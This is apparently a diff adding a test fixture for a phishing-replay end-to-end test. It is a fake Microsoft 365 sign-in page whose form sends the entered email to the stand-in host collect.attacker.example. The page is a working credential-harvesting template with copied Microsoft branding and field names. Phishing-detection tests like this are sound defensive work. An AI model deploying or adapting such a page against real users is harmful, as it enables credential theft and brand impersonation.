@@ -1,0 +1,15 @@
+<!doctype html>
+<!-- Sanitized fixture — fake Microsoft 365 login on attacker domain.
+     Use ONLY in tests/e2e/phishing-replay.spec.ts. -->
+<html lang="en"><head><meta charset="utf-8"><title>Sign in to your Microsoft account</title></head>
+<body>
+  <img alt="Microsoft" src="https://www.microsoft.com/favicon.ico" width="32" height="32">
+  <h1>Sign in</h1>
+  <p>Use your Microsoft account. No account? <a href="#">Create one!</a></p>
+  <form action="https://collect.attacker.example/post" method="post">
+    <input type="email" name="loginfmt" placeholder="Email, phone, or Skype" autocomplete="username">
+    <input type="hidden" name="flowToken" value="xxx"><input type="hidden" name="ctx" value="xxx">
+    <input type="hidden" name="canary" value="xxx"><input type="hidden" name="rt" value="xxx">
+    <button type="submit">Next</button>
+  </form>
+</body></html>
